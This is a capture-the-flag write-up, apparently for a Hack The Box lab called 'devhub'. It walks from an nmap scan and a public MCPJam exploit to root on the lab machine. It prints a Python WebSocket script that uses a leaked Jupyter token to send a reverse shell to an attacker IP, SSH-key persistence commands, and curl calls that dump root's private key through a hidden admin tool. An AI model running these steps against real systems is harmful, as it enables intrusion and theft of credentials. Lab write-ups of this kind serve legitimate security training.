# devhub

<img width="1593" height="289" alt="image" src="https://github.com/user-attachments/assets/34a39931-a69e-4d9f-a641-4681b72160d1" />

---

## `Nmap` Scan

```
nmap -sCV -Pn <IP_ADDRESS>
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 15:10 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.10% done; ETC: 15:11 (0:00:35 remaining)
Nmap scan report for 10.129.8.13
Host is up (0.43s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.67 seconds
                                                                         
```

<img width="1919" height="792" alt="image" src="https://github.com/user-attachments/assets/3005a3ec-6946-40ca-8923-8cded4018134" />

```
http://devhub.htb:6274/
```

<img width="1919" height="749" alt="image" src="https://github.com/user-attachments/assets/3f8d0438-ebd9-45a0-8f14-5aba4fdf99e8" />

## i search for **`MCPJam Version: v1.4.2`** exploit found :  

### [CVE-2026-23744](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py)

<img width="1469" height="122" alt="image" src="https://github.com/user-attachments/assets/44ca7de8-f901-419a-a56f-a1973272a70f" />

## get shell

<img width="760" height="131" alt="image" src="https://github.com/user-attachments/assets/c9150f08-2f73-4c8e-9299-ba5c04e18af3" />

## let's see mcp Systemd Services

```
systemctl list-units | grep -i mcp
```

<img width="1292" height="134" alt="image" src="https://github.com/user-attachments/assets/f8c5fb94-b25c-441c-b089-f44cf9ef5c4d" />

```
cat /etc/systemd/system/opsmcp.service
```

<img width="919" height="357" alt="image" src="https://github.com/user-attachments/assets/d8c1be03-477c-4f8b-82c0-3f33d6ae7888" />

> Key finding: The service runs as root!

##  from webstie we konw that : 

> port **`8888`** open has jypeter 

```
ss -tulpn
```

<img width="692" height="111" alt="image" src="https://github.com/user-attachments/assets/f78b56ee-2fc3-4f08-a896-1960e07c56d9" />

### Check running processes for Jupyter:

```
ps aux | grep jupyter
```

<img width="1718" height="343" alt="image" src="https://github.com/user-attachments/assets/1097b5e2-7d95-4fbd-9a18-d2dd37b5e4bf" />

> Critical discovery: JupyterLab is running with a visible token!

### Access JupyterLab API

Test access to Jupyter with the discovered token:

```
curl "http://localhost:8888/api/contents?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

<img width="1702" height="262" alt="image" src="https://github.com/user-attachments/assets/a7deb61f-7c52-4144-b856-6ae80c24162a" />

### Create a Terminal Session

Create a new terminal via Jupyter API:

```
curl -X POST "http://localhost:8888/api/terminals?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

<img width="1072" height="115" alt="image" src="https://github.com/user-attachments/assets/f9626116-3b0a-4d0f-9d99-7a4b4b82ec91" />

### Establish WebSocket Connection 

- Use Python to establish a WebSocket connection to the terminal:
- Send a reverse shell command through the WebSocket:

```python

python3 << 'EOF'
import socket
import base64
import struct
import json
import time

terminal_id = "1"
token = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"

def send_websocket_frame(ws, data):
    frame = bytearray()
    frame.append(0x81)
    length = len(data)
    if length <= 125:
        frame.append(length)
    else:
        frame.append(126)
        frame.extend(struct.pack('>H', length))
    frame.extend(data)
    ws.send(bytes(frame))

ws = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ws.connect(('localhost', 8888))

key = base64.b64encode(b'0123456789abcde').decode()
handshake = f'''GET /terminals/websocket/1?token={token} HTTP/1.1
Host: localhost:8888
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: {key}
Sec-WebSocket-Version: 13

'''
ws.send(handshake.encode())
ws.recv(1024)

# Send reverse shell command
cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.120\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
message = json.dumps(['stdin', cmd])
send_websocket_frame(ws, message.encode())
print("Reverse shell sent!")

time.sleep(2)
ws.close()
EOF

```

```
nc -lnvp 9999
```

<img width="600" height="143" alt="image" src="https://github.com/user-attachments/assets/83e42ee9-f65b-4d97-badc-06ee458b62b2" />

### Get User Flag

<img width="614" height="109" alt="image" src="https://github.com/user-attachments/assets/85205955-28f8-4b7b-97c3-63548bec343b" />

### Stabilize Shell with SSH

Create SSH directory and add your public key:

```
mkdir -p /home/analyst/.ssh
chmod 700 /home/analyst/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMBMHch8aDA8/Jsld3l4g/VFdsbonoPWlQ2Xl9oW+IUqJb23mDxZvDPtw+5z2TRPQXNcwVhlJVQm6kMb9tMSOyLJqBeqI5RfdfSbFYLFQG0P8a++Wo+7P42y7tp65ojrxcILVQDjjrSnM6futuNN8VnxAHF+AS599lPHOk3f97JZjmcjoEkstpE2TLJf4g4oUMe8snJv3yd2RiPaSkPRVWsqUanOD68DHIVfXI3eyPoUTn1fOVqlUVP0p5CzARSQ9i/0YHm6QFmSo+j9XshRDGXoU2WPs4mBi+MAyR4kNt37Mx+UpH6R/9HuLHBR+oLqROPwjKy40d8rLdZZg6XSczJcvWaG2xkd5hntitQVUbjPP/tBGy/IpZkTlKNLrv/yNYFaxs5Fg3I+Fuwu6G8WHN9zoyqAeVzfYArzrqA+IpxaeaHK8qPKea2+fLAyYHlBw/4yjBrN2HFtddnWNz6VxN9efOQWQLrqTchICAgDKgto7+LQ4+9cQq6iSMZ43HtzFc+uvTMwvKOE9j2yMYLnXe0bqCjy4ep+L/OQzYZwac/BefDCTcgfUQmHrFX8DiUXpgyoEP29WAr7hKZwCAz2xdQVXtn7+KyDSSdrY8f/QzNfTYSOb2Ftji0ZdSBSfbSPursT9ef+U+qMdxTFv5uP2eBBTZs/c0fC5TR6G+32qdKw== kali@kali" > /home/analyst/.ssh/authorized_keys
chmod 600 /home/analyst/.ssh/authorized_keys
```

> ####  Now SSH from your attacker machine:

```
ssh -i ~/analyst_key analyst@10.129.8.13
```

<img width="787" height="238" alt="image" src="https://github.com/user-attachments/assets/d88e4a49-22c4-4c02-82f9-eebab8e784e9" />

## Root Privilege Escalation

```
ps aux | grep -i mcp
```

```
root        1063  0.0  0.7  37376 28612 ?        Ss   19:07   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

```
cat /opt/opsmcp/server.py
```

### Key findings in server.py:

```json
VALID_API_KEY = ******************

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}

elif tool_name == "ops._admin_dump":
    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({"root_private_key": key_data})
```

<img width="1316" height="583" alt="image" src="https://github.com/user-attachments/assets/e9feae4b-d894-485e-b0ec-3f210512fc12" />

> Critical discovery: There's a hidden admin endpoint that can dump root's SSH private key!

### List Available Tools

First, test the API with the discovered key:

```
curl -X GET http://localhost:5000/tools/list \
  -H "X-API-Key: opsmcp_secret_key_*************"
```

<img width="1688" height="114" alt="image" src="https://github.com/user-attachments/assets/c2e81a36-73e7-4a6e-892f-f8e879333c58" />

### Dump Root SSH Key

Call the hidden admin tool:

```
curl -X POST http://localhost:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_************" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

Response contains root's private SSH key:

<img width="1711" height="352" alt="image" src="https://github.com/user-attachments/assets/ab6567cd-cebe-4e12-bd32-afb91e2d4267" />

### SSH as Root

Save the key on your attacker machine:

```
cat > root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
... (full key) ...
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 root_key
```

Connect as root:

```
ssh -i root_key root@10.129.8.13
```

<img width="983" height="143" alt="image" src="https://github.com/user-attachments/assets/ce225623-1bcb-4be5-961d-0d64f80d7210" />

